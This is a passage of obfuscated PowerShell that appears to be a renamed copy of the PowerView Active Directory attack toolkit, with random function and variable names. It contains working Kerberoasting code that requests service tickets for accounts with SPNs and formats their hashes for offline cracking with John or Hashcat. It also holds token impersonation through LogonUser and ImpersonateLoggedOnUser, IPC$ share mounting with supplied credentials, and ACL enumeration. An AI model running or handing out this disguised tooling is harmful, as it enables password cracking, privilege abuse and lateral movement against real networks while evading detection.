                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        jiggering -aCzrnrLk99 $UZgPkOzH99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[retrain] Error converting SID '$UZgPkOzH99' : $_"
            }
        }
    }
}


function jiggering {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $aCzrnrLk99,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $hKoxCyte99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nQcsoKHF99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        function Invoke-Method([__ComObject] $Object, [String] $RotDAwGI99, $igsiRcZA99) {
            $BjYCzrxj99 = $Null
            $BjYCzrxj99 = $Object.GetType().InvokeMember($RotDAwGI99, 'InvokeMethod', $NULL, $Object, $igsiRcZA99)
            Write-Output $BjYCzrxj99
        }

        function Get-Property([__ComObject] $Object, [String] $amaouzOP99) {
            $Object.GetType().InvokeMember($amaouzOP99, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $amaouzOP99, $igsiRcZA99) {
            [Void] $Object.GetType().InvokeMember($amaouzOP99, 'SetProperty', $NULL, $Object, $igsiRcZA99)
        }

        if ($PSBoundParameters['Server']) {
            $gXspFZuo99 = 2
            $EbObXBwg99 = $VmSwBdTN99
        }
        elseif ($PSBoundParameters['Domain']) {
            $gXspFZuo99 = 1
            $EbObXBwg99 = $XQOKQXGr99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $ZiReXCQu99.GetNetworkCredential()
            $gXspFZuo99 = 1
            $EbObXBwg99 = $Cred.Domain
        }
        else {
            $gXspFZuo99 = 3
            $EbObXBwg99 = $Null
        }
    }

    PROCESS {
        ForEach ($EBXEWUzG99 in $aCzrnrLk99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($EBXEWUzG99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $oOlCEevx99 = $nQcsoKHF99['DomainSimple']
                }
                else {
                    $oOlCEevx99 = $nQcsoKHF99['NT4']
                }
            }
            else {
                $oOlCEevx99 = $nQcsoKHF99[$hKoxCyte99]
            }

            $zqAmJjsQ99 = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $ZiReXCQu99.GetNetworkCredential()

                    Invoke-Method $zqAmJjsQ99 'InitEx' (
                        $gXspFZuo99,
                        $EbObXBwg99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[jiggering] Error initializing translation for '$aCzrnrLk99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $zqAmJjsQ99 'Init' (
                        $gXspFZuo99,
                        $EbObXBwg99
                    )
                }
                catch {
                    Write-Verbose "[jiggering] Error initializing translation for '$aCzrnrLk99' : $_"
                }
            }

            Set-Property $zqAmJjsQ99 'ChaseReferral' (0x60)

            try {
                $Null = Invoke-Method $zqAmJjsQ99 'Set' (8, $EBXEWUzG99)
                Invoke-Method $zqAmJjsQ99 'Get' ($oOlCEevx99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[jiggering] Error translating '$EBXEWUzG99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function repellent {

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $zntnXHqk99
    )

    BEGIN {
        $AnOoaidh99 = New-Object System.Collections.Specialized.OrderedDictionary
        $AnOoaidh99.Add("SCRIPT", 1)
        $AnOoaidh99.Add("ACCOUNTDISABLE", 2)
        $AnOoaidh99.Add("HOMEDIR_REQUIRED", 8)
        $AnOoaidh99.Add("LOCKOUT", 16)
        $AnOoaidh99.Add("PASSWD_NOTREQD", 32)
        $AnOoaidh99.Add("PASSWD_CANT_CHANGE", 64)
        $AnOoaidh99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $AnOoaidh99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $AnOoaidh99.Add("NORMAL_ACCOUNT", 512)
        $AnOoaidh99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $AnOoaidh99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $AnOoaidh99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $AnOoaidh99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $AnOoaidh99.Add("MNS_LOGON_ACCOUNT", 131072)
        $AnOoaidh99.Add("SMARTCARD_REQUIRED", 262144)
        $AnOoaidh99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $AnOoaidh99.Add("NOT_DELEGATED", 1048576)
        $AnOoaidh99.Add("USE_DES_KEY_ONLY", 2097152)
        $AnOoaidh99.Add("DONT_REQ_PREAUTH", 4194304)
        $AnOoaidh99.Add("PASSWORD_EXPIRED", 8388608)
        $AnOoaidh99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $AnOoaidh99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $uzLQxUyP99 = New-Object System.Collections.Specialized.OrderedDictionary

        if ($zntnXHqk99) {
            ForEach ($IfcDPFUO99 in $AnOoaidh99.GetEnumerator()) {
                if ( ($Value -band $IfcDPFUO99.Value) -eq $IfcDPFUO99.Value) {
                    $uzLQxUyP99.Add($IfcDPFUO99.Name, "$($IfcDPFUO99.Value)+")
                }
                else {
                    $uzLQxUyP99.Add($IfcDPFUO99.Name, "$($IfcDPFUO99.Value)")
                }
            }
        }
        else {
            ForEach ($IfcDPFUO99 in $AnOoaidh99.GetEnumerator()) {
                if ( ($Value -band $IfcDPFUO99.Value) -eq $IfcDPFUO99.Value) {
                    $uzLQxUyP99.Add($IfcDPFUO99.Name, "$($IfcDPFUO99.Value)")
                }
            }
        }
        $uzLQxUyP99
    }
}


function starched {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($aCzrnrLk99 -match '.+\\.+')) {
            if ($aCzrnrLk99 -match '.+\\.+') {
                $nBUlMslG99 = $aCzrnrLk99 | jiggering -hKoxCyte99 Canonical
                if ($nBUlMslG99) {
                    $CdWQJzxp99 = $nBUlMslG99.SubString(0, $nBUlMslG99.IndexOf('/'))
                    $HiBkOjBM99 = $aCzrnrLk99.Split('\')[1]
                    Write-Verbose "[starched] Binding to domain '$CdWQJzxp99'"
                }
            }
            else {
                $HiBkOjBM99 = $aCzrnrLk99
                Write-Verbose "[starched] Binding to domain '$XQOKQXGr99'"
                $CdWQJzxp99 = $XQOKQXGr99
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[starched] Using alternate credentials'
                $ezvcgGct99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $CdWQJzxp99, $ZiReXCQu99.UserName, $ZiReXCQu99.GetNetworkCredential().Password)
            }
            else {
                $ezvcgGct99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $CdWQJzxp99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[starched] Using alternate credentials'
                $ICTNZMXl99 = philately | Select-Object -ExpandProperty Name
                $ezvcgGct99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ICTNZMXl99, $ZiReXCQu99.UserName, $ZiReXCQu99.GetNetworkCredential().Password)
            }
            else {
                $ezvcgGct99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $HiBkOjBM99 = $aCzrnrLk99
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $ezvcgGct99
        $Out | Add-Member Noteproperty 'Identity' $HiBkOjBM99
        $Out
    }
    catch {
        Write-Warning "[starched] Error creating binding for object ('$aCzrnrLk99') context : $_"
    }
}


function crinkling {

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99
    )

    BEGIN {
        $rsJjFRTG99 = [Activator]::CreateInstance($dECxWMht99)
        $rsJjFRTG99.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($hfRnqCMk99 in $wkNUqpQt99) {
                $hfRnqCMk99 = $hfRnqCMk99.Trim('\')
                $Paths += ,"\\$hfRnqCMk99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($rSjMYowK99 in $Paths) {
            $rsJjFRTG99.lpRemoteName = $rSjMYowK99
            Write-Verbose "[crinkling] Attempting to mount: $rSjMYowK99"

            $BSvRtRei99 = $Mpr::WNetAddConnection2W($rsJjFRTG99, $ZiReXCQu99.GetNetworkCredential().Password, $ZiReXCQu99.UserName, 4)

            if ($BSvRtRei99 -eq 0) {
                Write-Verbose "$rSjMYowK99 successfully mounted"
            }
            else {
                Throw "[crinkling] error mounting $rSjMYowK99 : $(([ComponentModel.Win32Exception]$BSvRtRei99).Message)"
            }
        }
    }
}


function eraser {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($hfRnqCMk99 in $wkNUqpQt99) {
                $hfRnqCMk99 = $hfRnqCMk99.Trim('\')
                $Paths += ,"\\$hfRnqCMk99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($rSjMYowK99 in $Paths) {
            Write-Verbose "[eraser] Attempting to unmount: $rSjMYowK99"
            $BSvRtRei99 = $Mpr::WNetCancelConnection2($rSjMYowK99, 0, $True)

            if ($BSvRtRei99 -eq 0) {
                Write-Verbose "$rSjMYowK99 successfully ummounted"
            }
            else {
                Throw "[eraser] error unmounting $rSjMYowK99 : $(([ComponentModel.Win32Exception]$BSvRtRei99).Message)"
            }
        }
    }
}


function sinfulness {

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $LHlspMYk99,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[sinfulness] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $ARgGASvh99 = $LHlspMYk99
    }
    else {
        $ARgGASvh99 = [IntPtr]::Zero
        $mXqwKXiu99 = $ZiReXCQu99.GetNetworkCredential()
        $tpoFORKS99 = $mXqwKXiu99.Domain
        $OpgheHcJ99 = $mXqwKXiu99.UserName
        Write-Warning "[sinfulness] Executing LogonUser() with user: $($tpoFORKS99)\$($OpgheHcJ99)"

        $BSvRtRei99 = $PLdufbge99::LogonUser($OpgheHcJ99, $tpoFORKS99, $mXqwKXiu99.Password, 9, 3, [ref]$ARgGASvh99);$BxwMoRfM99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $BSvRtRei99) {
            throw "[sinfulness] LogonUser() Error: $(([ComponentModel.Win32Exception] $BxwMoRfM99).Message)"
        }
    }

    $BSvRtRei99 = $PLdufbge99::ImpersonateLoggedOnUser($ARgGASvh99)

    if (-not $BSvRtRei99) {
        throw "[sinfulness] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $BxwMoRfM99).Message)"
    }

    Write-Verbose "[sinfulness] Alternate credentials successfully impersonated"
    $ARgGASvh99
}


function impregnates {

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $LHlspMYk99
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[impregnates] Reverting token impersonation and closing LogonUser() token handle"
        $BSvRtRei99 = $Kernel32::CloseHandle($LHlspMYk99)
    }

    $BSvRtRei99 = $PLdufbge99::RevertToSelf();$BxwMoRfM99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $BSvRtRei99) {
        throw "[impregnates] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $BxwMoRfM99).Message)"
    }

    Write-Verbose "[impregnates] Token impersonation successfully reverted"
}


function Namibia {

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $EutNQZga99 = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $NNylLkoA99 = $User
        }
        else {
            $NNylLkoA99 = $SPN
        }

        ForEach ($Object in $NNylLkoA99) {
            if ($PSBoundParameters['User']) {
                $WGmDAYZZ99 = $Object.ServicePrincipalName
                $dABDhgNe99 = $Object.SamAccountName
                $JsUhIxkj99 = $Object.DistinguishedName
            }
            else {
                $WGmDAYZZ99 = $Object
                $dABDhgNe99 = 'UNKNOWN'
                $JsUhIxkj99 = 'UNKNOWN'
            }

            if ($WGmDAYZZ99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $WGmDAYZZ99 = $WGmDAYZZ99[0]
            }

            try {
                $oiVeqMjB99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $WGmDAYZZ99
            }
            catch {
                Write-Warning "[Namibia] Error requesting ticket for SPN '$WGmDAYZZ99' from user '$JsUhIxkj99' : $_"
            }
            if ($oiVeqMjB99) {
                $zZofiheP99 = $oiVeqMjB99.GetRequest()
            }
            if ($zZofiheP99) {
                $Out = New-Object PSObject

                $heIMkopM99 = [System.BitConverter]::ToString($zZofiheP99) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $dABDhgNe99
                $Out | Add-Member Noteproperty 'DistinguishedName' $JsUhIxkj99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $oiVeqMjB99.ServicePrincipalName

                if($heIMkopM99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $DuNsjLax99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $RlegRHSd99 = $Matches.DataToEnd.Substring(0,$DuNsjLax99*2)

                    if($Matches.DataToEnd.Substring($DuNsjLax99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($oiVeqMjB99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($zZofiheP99).Replace('-',''))
                    } else {
                        $Hash = "$($RlegRHSd99.Substring(0,32))`$$($RlegRHSd99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($oiVeqMjB99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($zZofiheP99).Replace('-',''))
                }

                if($Hash) {
                    if ($EutNQZga99 -match 'John') {
                        $biGGNLXk99 = "`$QdZdjYNs99`$$($oiVeqMjB99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($JsUhIxkj99 -ne 'UNKNOWN') {
                            $tpoFORKS99 = $JsUhIxkj99.SubString($JsUhIxkj99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $tpoFORKS99 = 'UNKNOWN'
                        }

                        $biGGNLXk99 = "`$QdZdjYNs99`$$($Etype)`$*$dABDhgNe99`$$tpoFORKS99`$$($oiVeqMjB99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $biGGNLXk99
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function Jerrold {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $EutNQZga99 = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nJXaFCNO99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $nJXaFCNO99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $nJXaFCNO99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $nJXaFCNO99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $nJXaFCNO99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $nJXaFCNO99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $nJXaFCNO99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nJXaFCNO99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $nJXaFCNO99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $nJXaFCNO99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $nJXaFCNO99['Identity'] = $aCzrnrLk99 }
        bobcats @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Namibia -EutNQZga99 $EutNQZga99
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function milkweed {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function recoups {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $CUPlDwOV99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $NwyTTIji99 = @()

            $NwyTTIji99 += $CUPlDwOV99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $CUPlDwOV99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            $NwyTTIji99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($NwyTTIji99 | Where-Object {$_}) -join ','
        }

        $LMcZTOxl99 = @{}
        if ($PSBoundParameters['Credential']) { $LMcZTOxl99['Credential'] = $ZiReXCQu99 }

        $rdBTKSlm99 = @{}
    }

    PROCESS {
        ForEach ($rSjMYowK99 in $Path) {
            try {
                if (($rSjMYowK99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $GhoLUzNa99 = (New-Object System.Uri($rSjMYowK99)).Host
                    if (-not $rdBTKSlm99[$GhoLUzNa99]) {
                        crinkling -wkNUqpQt99 $GhoLUzNa99 -ZiReXCQu99 $ZiReXCQu99
                        $rdBTKSlm99[$GhoLUzNa99] = $True
                    }
                }

                $ACL = Get-Acl -Path $rSjMYowK99

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = retrain -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $rSjMYowK99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (recoups -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[milkweed] error: $_"
            }
        }
    }

    END {
        $rdBTKSlm99.Keys | eraser
    }
}


function meridian {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $kaLEgole99
    )

    $djywXOyM99 = @{}

    $kaLEgole99.PropertyNames | ForEach-Object {
